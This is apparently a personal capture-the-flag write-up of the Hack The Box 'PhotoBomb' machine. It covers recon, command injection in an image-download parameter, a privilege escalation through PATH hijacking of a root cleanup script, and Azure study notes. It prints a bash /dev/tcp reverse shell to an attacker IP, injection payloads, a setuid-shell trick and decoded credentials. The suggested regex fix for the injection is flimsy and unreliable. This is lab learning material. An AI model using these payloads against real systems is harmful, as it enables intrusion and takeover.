# PhotoBomb Helped-Through

Name: PhotoBomb
Date:  1/3/2023
Difficulty:  Easy
Goals:  
- Saw it was a twenty minute Ippsec Video
- Generally evaluate on a CTFy box 
- Timeings 1hr including scans:
	- Solo -> Solo if fail Forums -> Ippsec Intro -> Ippsec Staggered
- Make Photobomb in Azure as I failed timings 
Learnt:
- WTFis Sintra
- I need to do more Novel-For-Me stuff to improve how I overcoming new challenges
- Add parameters - I tried injecting into what was avaliable sometimes try the null space...
- I need to rope learn the symaticaticness of check today. 
	- I need to practice fine tuning methodolgy on a set of 10 boxes over the coming months and a half as general follow up, before continuing with more PG or OSCP-likes.
Beyond Root:
- Azure AZ 104 contextualise
	- Update and fault domain 
	- Host Photobomb as an app service plan and discuss context 
	- Application Proxy and use case in Photobomb
	- Configure DNS for multiple vnets to host photobomb internally
	- -EnableLargeFileShare research

UPDATE: 14/3/12023

Got 70 something percent on Microsoft Assesssment for testing my Azure AZ 104 knowledge post [[Monteverde-Helped-Through]]. Which is 10% on the exam attempt, so hopeful next week I will be on track to pass and return to my schedule of cleaning up my github:
- 13 plus easy boxes - no writeups that each test my methodology 9 are mostly Web exploits I know the attack path for, but not the Privescs web or OS; one is cve for OSCPesquesness the rest are Dante path and I need one box that has MSSQL for my own exposure.

#### Two weeks earlier...

On peaking at the forums hinted to fuzz and injection and learning to add addition parametres, which was the big takeway from the box up to the RCE. I had not manage to get an RCE, but found where. Also I though Sintra was a user, which lead my thinking to not contextualise the box correctly. Also ruby web app frameworks exist - in my brain ruby == metasploit. There are some nice picture on this box ten minutes of playing with the download functionality to test whether I LFI or RFI lead also pick some nice wallpapers. Enjoy the thematic frame of picture and word through.

Peaking thirough the app with `CTRL+U`
![](photobomb-apostol-unsplash.png)

## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/PhotoBomb/Screenshots/ping.png)

- SSH x Ubunutu versioning: [Ubuntu Bionic](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5)
- nmap reported the redirect to photobomb.htb

We need credentials...
![](kevin-charit-XZoaTJTnB9U-unsplash_3000x2000.png)
Contrasting white and water and the states of water make this photo make you feel cold and breath-taken-and-replaced-with-icy-Oxygen.

This lead to the Download testing:
![1080](welcomepacktofind.png)

Sinatra is a ruby framework I later dorked...
![1080](niktofindweirdness.png)

On using hostname with nikto got some weird negatives hitting on the same Sinatra backend
![1080](niktoisgoingwild.png)

Whatever it was it operates on a port.
![](sintraisonthe127001.png)
https://sinatrarb.com/

This were recon of Sinatra was sidelined... As I bypass thenon-existent login with credentials - cookie and/or the http://ph0t0b0mb:

Gospider is awesome.
![1080](gospideriseyes.png)

This lead to the Download testing:
![](kevin-charit-XZoaTJTnB9U-unsplash_3000x2000.png)
Contrasting white and water and the states of water make this photo make you feel cold and breath-taken-and-replaced-with-icy-Oxygen.

I discover the cookie
[The HTTP **`WWW-Authenticate`** response header defines the [HTTP authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication) methods ("challenges") that might be used to gain access to a specific resource.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate)

nginx/1.18.0 - is not vulnerable
![1080](adminareas.png)
- It only downloads png from filetype= regardless
- It is a post request. 

```
Authorization: Basic cEgwdDA6YjBNYiE=
```

![1080](seriouscreds.png)
```bash
echo "cEgwdDA6YjBNYiE=" | base64 -d
pH0t0:b0Mb!
```

I tried LFI
![1080](nonexistent.png)

Forum hinted, began fuzzing parameter
- Fuzz the parametres
![1080](inject.png)

Add a parameter...
![1080](addtheinjection.png)
[Hack Trick CMDi](https://book.hacktricks.xyz/pentesting-web/command-injection) - got nothing.

I watched [Ippsec](https://www.youtube.com/watch?v=-4asq6Tldf0&t=270s) to figure out what I am doing right and wrong.. and what is new to me: ...

Right:
- Checking the paramaters/error one by one
- Finding different error messages
	- Understanding the rabbit holes
- Recursive testing 
- Enumerate LFI
- Adding a `/` before `filename` and `.ext` invalid file checks

Wrong:
- Did not check:
	- `php://` filters [[Watcher-Helped-Through]] - here we go!
		- Its actual ruby not php and not js
- I definately hung the application on the filetype, but could not replicate it again and 
- Forums can be a rabbit hole in themselves
	- You think that some step to a answer is sort of there and you give that information more legitamacy that it should
- Not Enforce manditory C+P of Checks per X vuln, (Y(i) parametre, SEND-TYPE,) 
	- Big O Notation of rabbit holes... nice.

Novel methodology:
- Add a `.` betwen `filename` and `.ext` for invalid file checks
- Adding a `/` in the middle of `filename.ext` to check characters
- For [[SQHell-Helped-Through]] I wrote down what the application is doing - added a section to my note taking and methodoolgy to reenforce that. I have been trying to understand the applications I encounter

Ippsec demoing cmdi
```php
convert -input $photo -convertto/-type $filetype; -size $dimensions
// Is the application put the -converto in the middle and requiring us to put a 2nd ; in ;CMD (;)
convert -input $photo -convertto/-type $filetype;sleep 5 -size $dimensions
convert -input $photo -convertto/-type $filetype;sleep 5; -size $dimensions
// Ippsec them makes use consider the ordering of this
convert -input $photo -size $dimensions -type $filetype;sleep 5; -
// Remember /usr/bin/sleep, ping for callback
```

[Ama2 points out](https://forum.hackthebox.com/t/official-photobomb-discussion/265724/134):

https://portswigger.net/web-security/os-command-injection
https://www.golinuxcloud.com/create-reverse-shell-cheat-sheet/
https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469


## Exploit

The reason I think this photo is hilarious is the bias in my head of people with setups where they love decluttering and miminalism because they lack character and make up for it with aesthesism. Also Camera as decoration, no mat/cooster for mug/cup, no mouse mat to scratch your mahogany table, its a mac that looks like out of the Fallout series owned by "technological advanced peoples" and lastly a keyboard I would happly melt down every single one in existence as they are horrific to type on.  There is also a cover on the camera to protect the lense while monitor camera is under covered. This picture looks like a kind of hell you can only achieve by really trying in  the West.
![](nathaniel-worrell-zK_az6W3xIo-unsplash_3000x2000.png)

At this point I listened to the intro of the Ippsec Video. Sintra is framework. I dorked it in the second session, but me thinking it was some kind of User/Bot thing that lead nowhere had lead to me not aligning Framework -> Language RCE in that language maybe as I was trying Express.

![1080](cmdirevshell.png)

## Foothold

The road outlined by buildings, the road is the path to the sky and the road is reflected in space by what is visible of the sky.
![](andrea-de-santis-uCFuP0Gc_MM-unsplash_3000x2000.png)
This lead to the Download testing:
![](kevin-charit-XZoaTJTnB9U-unsplash_3000x2000.png)
Contrasting white and water and the states of water make this photo make you feel cold and breath-taken-and-replaced-with-icy-Oxygen.

Wizard user  

![](sudowizard.png)

[Paused video here](https://www.youtube.com/watch?v=-4asq6Tldf0&t=611s)

Wizrad users is a created user for the box and is not a a default install or service intalled user.
![](wizarduser.png)

This user has a home directory so was created with box deployment/installation as inital user.
![](withhomedir.png)

Research 
- env_reset 
	- Used to reset the env after completing use of sudo
- mail_badpass
	- Sends mail to bad sudo usages.

We are running this as root
```bash
#!/bin/bash
# /opt/cleanup.sh

. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Make a priceless shell with /bin/bash with setuid then let the script change it to be owned by root. 
- Incorrect chown resets any special setuid permission because you are change a user context.

## PrivEsc

```bash
cd /home/wizard/photobomb/source_images
cp /bin/bash pricelessprivesc.jpg
# becuase I trying to do this from memory
# We may need more than just +s to exec or change ext
chmod 777 pricelessprivesc.jpg
chmod +s pricelessprivesc.jpg
```

But we need to configure the env_reset to prevent loss of sudo env
- Incorrect as env_reset just reset env

Incoming... https://superuser.com/questions/232231/how-do-i-make-sudo-preserve-my-environment-variables and beyond...

On returning to this box [Hack-Tools](https://github.com/LasCC/Hack-Tools) got updated! For some reason there is not -c, but there is loads of new features! More reverse shells and shell drop down for defining sh, bash, powershell, cmd! 
```bash
Authorization: Basic cEgwdDA6YjBNYiE=
bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.122/33300+0>%261'
python3 -c 'import pty;pty.spawn("/bin/bash")'

stty raw -echo;fg
```

Before looking at [the hinted blog](https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469)
- It is a path variable....
```bash
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
OK either we inject a shell that is named `find` into a path or I am incorrect. 
![](roguefindinthepath.png)
Due working out I am incorrect I then read the article...we can just write our own path because we own the pathing...
![](whatamidoingwrong.png)

Rust is showing. OK Ippsec explains:
- Sudo needs a path because sudo need a `PATH=...` 

I really have not done Linux PrivEsc like this in a while...well that decide the next Azure connected box

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

The colours of this photo are awesome.
![](mark-mc-neill-4xWHIpY2QcY-unsplash_3000x2000.png)

For the additional way describe by [Ippsec](https://www.youtube.com/watch?v=-4asq6Tldf0) was something I wondered as to why it was calling .bashrc that is root owned in /opt/
```bash
# .bashrc weirdness
# disabling a bash builtin may lead to path injection
enable -n $Builtin
# As pathing to the builtin that is a file is then controllable:
export PATH=/dev/shm:$PATH
/dev/shm/[
```

Look into the following as Sinatra and Ruby web apps have never come up in CTFs so I researched:
https://security.snyk.io/package/rubygems/sinatra
https://github.com/sinatra
https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html

Latter provides some interesting reading:
- Ruby has xss I thought that was just a javascript thing
Also read [0xdf for the complete Ippsec x 0xDF bare minimum](https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html#shell-as-root) which lead to reading the [enable man page](https://linuxcommand.org/lc3_man_pages/enableh.html), which  is nice and short 

## Beyond Root

#### Fixing the website

Remove link the Javascript file that discloses 
```bash
rm public/photobomb.js
# Talk to the tech support manager.
```

Fix the CMDi vulnerability
```ruby 
# Original
if !filetype.match(/^(png|jpg)/)
	halt 500, 'Invalid filetype.'
end
# Added conditional
if filetype.match(/[!@#$^&*()_-;:_*]/)
	halt 500, 'CMDi Detected'
```

#### Fixing the PrivEscs

Re-structure the users 
```bash
# Add a website user
useradd www-data

mv photobomb /var/www/html/
chown -R www-data:www-data

```

If they really wanted a local backup.
```bash
cp -r source_images/ root/source_images
```


#### Azure

First and most improtantly Azure storage of the images in a geo-zonal redundant vault for maximum retention of th original sources.

![](Photobomb4Azure)

- Azure AZ 104 contextualise objectives
	- Update and fault domains 
	- Host Photobomb as an app service plan and discuss context 
	- Application Proxy and use case in Photobomb
	- Configure DNS for multiple vnets to host photobomb internally
	- -EnableLargeFileShare research

Specification reinterpretation for the web site:

Internally host website with a domain name 

Vnet that avaliability zone to host VMs

File server for staff photos 

Replication of databases, data, photos

Increase the interal fileshare with powershell

Also a Public version using a App server plan

Custom DNS 

Fix the website recap - TIL Azure DevOps, Azure IAM with SAS and SSPR, while creating a Azure K8 for testing:
1. Allow linking to the photobomb download page - assume people are able to use it- fix the cmdi as provide
2. Remove the cookie to access
	1. Create SAS tokens for guest consultant Developers and Techsupport to access the Dev site


